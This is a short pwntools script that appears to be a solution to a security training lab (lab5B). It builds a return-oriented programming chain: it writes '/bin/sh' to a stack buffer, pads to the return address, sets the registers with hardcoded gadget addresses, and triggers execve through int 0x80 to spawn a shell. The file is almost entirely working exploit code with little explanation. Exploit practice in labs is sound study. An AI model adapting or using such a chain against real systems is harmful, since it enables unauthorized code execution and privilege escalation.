from pwn import *

#proc = process("/tmp/lab5B")

buff_addr = 0xbffff690
pop_eax = 0x080bbb06
#pop_eax = 0x080bbf26
pop_edx = 0x0806ed3a
#pop_edx = 0x0806ec5a
pop_ebx = 0x080481c9
#zero_eax_pop_ebx = 0x0808fe3f
#pop_ecx = 0x080e55ad
pop_ecx = 0x080e51d1

int_80 = 0x08049401

#####ropchain
rop = "/bin/sh\x00"
#pack to get to 140 bytes (inc) to ret addr
rop += "A" * 132

#put binsh in buffer
rop += p32(pop_ebx)
rop += p32(buff_addr)

#other args
rop += p32(pop_eax)
rop += p32(0x0b)

rop += p32(pop_ecx)
rop += p32(0x00)

rop += p32(pop_edx)
rop += p32(0x00)

#interrupt
rop += p32(int_80)
print(rop)
